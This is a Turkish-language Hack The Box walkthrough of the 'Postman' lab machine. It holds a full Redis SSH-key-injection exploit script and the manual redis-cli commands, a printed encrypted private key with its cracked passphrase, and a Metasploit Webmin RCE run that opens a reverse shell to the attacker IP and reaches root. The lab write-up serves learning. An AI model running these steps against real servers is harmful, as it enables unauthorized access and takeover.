---
title: "[HTB] Postman Writeup"
layout: post
---

*HTB Postman* 

```sh
nano /etc/hosts  >>>>>  10.10.10.160    postman.htb
```
*  Enumeration:

```sh
root@kali:~/Desktop# nmap -sV -sC -p- postman.htb 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-11-16 03:06 +03
Nmap scan report for postman.htb (10.10.10.160)
Host is up (0.082s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 103.92 seconds
```

elde edilen çıktı doğrultusunda 4 adet port açık olduğu görülmüştür.Bu aşamada ilk olarak 80 portunda ne var diye oraya bir gitmemizde fayda var, daha sonra 6379 ve 10000 de çalışan servisleri kontrol edeceğiz.

* http://postman.htb/ adresine gittiğimizde bizi bir web sitesi karşılıyor bu noktada aklımıza ilk gelebilecek şey herhangi bir dizin mevcut mu ? sorusu oluyor , bunun için wfuzz aracı yardımıyla directory brute-force işlemi gerçekleştirip enumeration aşamamızı biraz daha ileri götürüyoruz.
```sh
root@kali:~/Desktop# wfuzz -w /usr/share/wordlists/dirb/big.txt -u http://postman.htb/FUZZ --hc=404,500 -c 

********************************************************
* Wfuzz 2.4 - The Web Fuzzer                           *
********************************************************

Target: http://postman.htb/FUZZ
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload    
===================================================================

000000015:   403        11 L     32 W     295 Ch      ".htaccess"
000000016:   403        11 L     32 W     295 Ch      ".htpasswd"
000005517:   301        9 L      28 W     308 Ch      "css"      
000007795:   301        9 L      28 W     310 Ch      "fonts"    
000009378:   301        9 L      28 W     311 Ch      "images"   
000010190:   301        9 L      28 W     307 Ch      "js"       
000016215:   403        11 L     32 W     299 Ch      "server-status"       
000018744:   301        9 L      28 W     311 Ch      "upload"   

Total time: 146.0312
Processed Requests: 20469
Filtered Requests: 20461
Requests/sec.: 140.1686

```
İlgili adreste directory brute-force işleminde sonra elde edilenler yukarıdaki gibi , ilgi çekici dizinlerden biri upload dizini oluyor fakat ilgili dizinden herhangi bir bilgi elde edemiyoruz veya dosya yükleyemiyoruz.Bu aşamada 80 portu ile ilgili yaptığımız enumeration süreci sonlanıyor.

* Port 6379 Redis key-value store 4.0.9

İlgili porta ait olan servisle ilgili ufak bir google araştırmasından sonra karşımıza https://github.com/Avinash-acid/Redis-Server-Exploit adresindeki exploitimiz çıkıyor.

İlgili exploit , Redis sunucusunun düzgün bir şekilde yapılandırılmaması ve herhangi bir kontrol mekanizması olmadan internete açılmasından faydalanarak bize bir adet shell sağlıyor.

tabii bu shell'i bize sağlaması için içeriden valid bir kullanıcı elde etmemizi veya bilmemizi bekliyor.(Bu noktada çok basit bir deneme yaparak "redis" user'ını denedim.)
```
Valid User : redis 
```
Bu ufak ön bilgilendirmeden sonra exploit kodu içerisine gidip neyi nasıl yapıyor bir bakıyoruz ; 
```sh
#!/usr/bin/python
#Author : Avinash Kumar Thapa aka -Acid
#Twitter : https://twitter.com/m_avinash143
#####################################################################################################################################################

import os
import os.path
from sys import argv
from termcolor import colored


script, ip_address, username = argv


PATH='/usr/bin/redis-cli'
PATH1='/usr/local/bin/redis-cli'

def ssh_connection():
	shell = "ssh -i " + '$HOME/.ssh/id_rsa ' + username+"@"+ip_address
	os.system(shell)

if os.path.isfile(PATH) or os.path.isfile(PATH1):
	try:
    		print colored('\t*******************************************************************', "green")
    		print colored('\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*' ,"green")
    		print colored('\t* [+] AVINASH KUMAR THAPA aka "-Acid"                                ', "green")
		print colored('\t*******************************************************************', "green")
		print "\n"
		print colored("\t SSH Keys Need to be Generated", 'blue')
		os.system('ssh-keygen -t rsa -C \"acid_creative\"')
		print colored("\t Keys Generated Successfully", "blue")
		os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') > $HOME/.ssh/public_key.txt")
		cmd = "redis-cli -h " + ip_address + ' flushall'
		cmd1 = "redis-cli -h " + ip_address
		os.system(cmd)
		cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " +  ip_address + ' -x set cracklist'
		os.system(cmd2)
		cmd3 = cmd1 + ' config set dbfilename "backup.db" '
		cmd4 = cmd1 + ' config set  dir' + " /home/"+username+"/.ssh/"
		cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
		cmd6 = cmd1 + ' save'
		os.system(cmd3)
		os.system(cmd4)
		os.system(cmd5)
		os.system(cmd6)
		print colored("\tYou'll get shell in sometime..Thanks for your patience", "green")
		ssh_connection()

	except:
		print "Something went wrong"
else:
	print colored("\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further.", "red")

```
* kodumuz bize, SSH üzerinden geçerli bir kullanıcıyla bağlantı kurmak için RSA anahtarı enjekte edebileceğini söylemiş...
Aynı şekilde python scripti dışında  bir de poc de manuel explotation için mevcut bu noktada ben poc üzerinden gitmeyi tercih ettim.

* POC ----->>>>>> https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html

    yine poc dışında faydalandığım diğer bir kaynak ise https://redis.io/commands adresindeki komutlar oldu , redis-cli uygulması ile ilgili dizinleri keşfedeceğimiz komutları ve yolları buradan araştırdım.

Poc'yi uygulamaya geçmeden önce ilgili zafiyette bahsedilen RSA enjeksiyon olayı için doğru bir path lazım , bu noktada redis-cli uygulamamızı kullanarak ihtiyacımız olan bilgileri toplayacağız (*username*/.ssh); 
```sh
root@kali:~/Desktop/htb-machines/payloads# redis-cli -h postman.htb
postman.htb:6379> config get *
  1) "dbfilename"
  2) "authorized_keys"
  3) "requirepass"
  4) ""
  5) "masterauth"
  6) ""
  7) "cluster-announce-ip"
  8) ""
  9) "unixsocket"
 10) ""
 11) "logfile"
 12) "/var/log/redis/redis-server.log"
 13) "pidfile"
 14) "/var/run/redis/redis-server.pid"
 15) "slave-announce-ip"
 16) ""
 17) "maxmemory"
 18) "0"
 19) "proto-max-bulk-len"
 20) "536870912"
 21) "client-query-buffer-limit"
 22) "1073741824"
 23) "maxmemory-samples"
 24) "5"
 25) "lfu-log-factor"
 26) "10"
 27) "lfu-decay-time"
 28) "1"
 29) "timeout"
 30) "0"
 31) "active-defrag-threshold-lower"
 32) "10"
 33) "active-defrag-threshold-upper"
 34) "100"
 35) "active-defrag-ignore-bytes"
 36) "104857600"
 37) "active-defrag-cycle-min"
 38) "25"
 39) "active-defrag-cycle-max"
 40) "75"
 41) "auto-aof-rewrite-percentage"
 42) "100"
 43) "auto-aof-rewrite-min-size"
 44) "67108864"
 45) "hash-max-ziplist-entries"
 46) "512"
 47) "hash-max-ziplist-value"
 48) "64"
 49) "list-max-ziplist-size"
 50) "-2"
 51) "list-compress-depth"
 52) "0"
 53) "set-max-intset-entries"
 54) "512"
 55) "zset-max-ziplist-entries"
 56) "128"
 57) "zset-max-ziplist-value"
 58) "64"
 59) "hll-sparse-max-bytes"
 60) "3000"
 61) "lua-time-limit"
 62) "5000"
 63) "slowlog-log-slower-than"
 64) "10000"
 65) "latency-monitor-threshold"
 66) "0"
 67) "slowlog-max-len"
 68) "128"
 69) "port"
 70) "6379"
 71) "cluster-announce-port"
 72) "0"
 73) "cluster-announce-bus-port"
 74) "0"
 75) "tcp-backlog"
 76) "511"
 77) "databases"
 78) "16"
 79) "repl-ping-slave-period"
 80) "10"
 81) "repl-timeout"
 82) "60"
 83) "repl-backlog-size"
 84) "1048576"
 85) "repl-backlog-ttl"
 86) "3600"
 87) "maxclients"
 88) "10000"
 89) "watchdog-period"
 90) "0"
 91) "slave-priority"
 92) "100"
 93) "slave-announce-port"
 94) "0"
 95) "min-slaves-to-write"
 96) "0"
 97) "min-slaves-max-lag"
 98) "10"
 99) "hz"
100) "10"
101) "cluster-node-timeout"
102) "15000"
103) "cluster-migration-barrier"
104) "1"
105) "cluster-slave-validity-factor"
106) "10"
107) "repl-diskless-sync-delay"
108) "5"
109) "tcp-keepalive"
110) "300"
111) "cluster-require-full-coverage"
112) "yes"
113) "cluster-slave-no-failover"
114) "no"
115) "no-appendfsync-on-rewrite"
116) "no"
117) "slave-serve-stale-data"
118) "yes"
119) "slave-read-only"
120) "yes"
121) "stop-writes-on-bgsave-error"
122) "yes"
123) "daemonize"
124) "yes"
125) "rdbcompression"
126) "yes"
127) "rdbchecksum"
128) "yes"
129) "activerehashing"
130) "yes"
131) "activedefrag"
132) "no"
133) "protected-mode"
134) "no"
135) "repl-disable-tcp-nodelay"
136) "no"
137) "repl-diskless-sync"
138) "no"
139) "aof-rewrite-incremental-fsync"
140) "yes"
141) "aof-load-truncated"
142) "yes"
143) "aof-use-rdb-preamble"
144) "no"
145) "lazyfree-lazy-eviction"
146) "no"
147) "lazyfree-lazy-expire"
148) "no"
149) "lazyfree-lazy-server-del"
150) "no"
151) "slave-lazy-flush"
152) "no"
153) "maxmemory-policy"
154) "noeviction"
155) "loglevel"
156) "notice"
157) "supervised"
158) "no"
159) "appendfsync"
160) "everysec"
161) "syslog-facility"
162) "local0"
163) "appendonly"
164) "no"
165) "dir"
166) "/var/lib/redis/.ssh"
167) "save"
168) "900 1 300 10 60 10000"
169) "client-output-buffer-limit"
170) "normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"
171) "unixsocketperm"
172) "0"
173) "slaveof"
174) "10.10.14.23 4444"
175) "notify-keyspace-events"
176) ""
177) "bind"
178) "0.0.0.0 ::1"
```
şimdi gelelim shell alma kısmına burada poc'yi takip ederek sırasıyla işlemlerimizi gerçekleştiriyoruz ;

```sh
root@kali:~/.ssh# (echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > foo.txt
root@kali:~/.ssh# ls
foo.txt  id_rsa  id_rsa.pub
root@kali:~/.ssh# cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
OK
root@kali:~/.ssh# redis-cli -h 10.10.10.160
10.10.10.160:6379> config set dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> quit
root@kali:~/.ssh# ssh -i id_rsa
id_rsa      id_rsa.pub  
root@kali:~/.ssh# ssh -i id_rsa
id_rsa      id_rsa.pub  
root@kali:~/.ssh# ssh -i id_rsa redis@postman.htb
The authenticity of host 'postman.htb (10.10.10.160)' can't be established.
ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'postman.htb,10.10.10.160' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
redis@Postman:~$ 
```

shell'i aldıktan sonra içerideki user.txt dosyamızı okuyup okuyamadığımızı kontrol etmek amacıyla ; 
```sh
redis@Postman:/home/Matt$ ls -la 
total 52
drwxr-xr-x 6 Matt Matt 4096 Sep 11 11:28 .
drwxr-xr-x 3 root root 4096 Sep 11 11:27 ..
-rw------- 1 Matt Matt 1676 Sep 11 11:46 .bash_history
-rw-r--r-- 1 Matt Matt  220 Aug 25 15:10 .bash_logout
-rw-r--r-- 1 Matt Matt 3771 Aug 25 15:10 .bashrc
drwx------ 2 Matt Matt 4096 Aug 25 18:20 .cache
drwx------ 3 Matt Matt 4096 Aug 25 23:23 .gnupg
drwxrwxr-x 3 Matt Matt 4096 Aug 25 23:29 .local
-rw-r--r-- 1 Matt Matt  807 Aug 25 15:10 .profile
-rw-rw-r-- 1 Matt Matt   66 Aug 26 00:48 .selected_editor
drwx------ 2 Matt Matt 4096 Aug 26 00:04 .ssh
-rw-rw---- 1 Matt Matt   33 Aug 26 03:07 user.txt
-rw-rw-r-- 1 Matt Matt  181 Aug 25 18:22 .wget-hsts
redis@Postman:/home/Matt$ cat user.txt
cat: user.txt: Permission denied
```
İlgili kullanıcıya sahip olamamız sebebiyle user.txt dosyasını okuyamadık , bu aşamada sistem içerisindeki dizinler gezilirken /opt dizini içerisindeki dosya dikkat çekiyor ; 
```sh
redis@Postman:/opt$ ls
id_rsa.bak
redis@Postman:/opt$ ls -la 
total 12
drwxr-xr-x  2 root root 4096 Sep 11 11:28 .
drwxr-xr-x 22 root root 4096 Aug 25 15:03 ..
-rwxr-xr-x  1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak
redis@Postman:/opt$ cat id_rsa.bak 
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C

JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==
-----END RSA PRIVATE KEY-----
redis@Postman:/opt$ 
```
 Matt kullanıcısına ait private key dosyasının backup hali karşımıza çıktı ve ilgili dosyaya john ile brute-force yaparak parolayı elde edebileceğiz.

İlk olarak id_rsa.bak dosyasının hash'ini almamız gerekiyor ;
```sh
root@kali:~/Desktop/htb-machines/payloads# python ssh2john.py id_rsa.bak > RSA.hash
```
Sonrasında john ile brute-force işlemimizi başlatıyoruz ; 
```sh
root@kali:~/Desktop# john --wordlist=rockyou.txt RSA.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)
```
Matt kullanıcısına ait parola 'computer2008' olarak karşımıza çıkıyor bu noktada redis kullanısından Matt kullanıcısına geçiyoruz ; 
```sh
redis@Postman:/home$ cd Matt/
redis@Postman:/home/Matt$ ls
user.txt
redis@Postman:/home/Matt$ su Matt
Password: 
Matt@Postman:~$ cat user.txt 
517ad*******************
```
Root olabilmek adına , nmap'te diğer bir dikkat çekici nokta olan 10000 portunda çalışan webmin'e gidiyoruz, ilgili sayfada klasik bir login ekranı bizi karşılarken kaynak kod içerisinde ; 
```
data-title-initial="Webmin 1.910 (Ubuntu Linux 18.04.3)"
```
Webmin versiyonunu tespit ediyoruz.Ufak bir google araştırması sonucunda ; 
https://www.exploit-db.com/exploits/46984 
root için gerekli olan exploit'i elde etmiş oluyoruz.Exploit bizden bir takım credential'ları istiyor.(username:password) Webmin Login sayfasında elde ettiğimiz Matt kullanıcısına ait bilgiler ile login olup olamadığımızı bu aşamada kontrol ediyoruz ve başarılı bir sonuç alıyoruz.İlgili exploit modülünü Metasploit-Framework yardımıyla çalıştırıyoruz ; 
```sh
msf5 exploit(linux/http/webmin_packageup_rce) > options 

Module options (exploit/linux/http/webmin_packageup_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   PASSWORD                    yes       Webmin Password
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      10000            yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path for Webmin application
   USERNAME                    yes       Webmin Username
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Webmin <= 1.910


msf5 exploit(linux/http/webmin_packageup_rce) > set lhost tun0
lhost => 10.10.14.18
msf5 exploit(linux/http/webmin_packageup_rce) > set lport 3131
lport => 3131
msf5 exploit(linux/http/webmin_packageup_rce) > set username Matt
username => Matt
msf5 exploit(linux/http/webmin_packageup_rce) > set password computer2008
password => computer2008
msf5 exploit(linux/http/webmin_packageup_rce) > set ssl true
ssl => true
msf5 exploit(linux/http/webmin_packageup_rce) > set rhosts postman.htb
rhosts => postman.htb
msf5 exploit(linux/http/webmin_packageup_rce) > exploit 

[*] Started reverse TCP handler on 10.10.14.18:3131 
[+] Session cookie: 37647b208b7600ffafd270320ce72e5
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.18:3131 -> 10.10.10.160:35718) at 2019-11-16 06:06:30 +0300
whoami

root
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
a2577***************************
```


r00t3d



# Author <a href=" https://twitter.com/root1x">root1x</a> 
---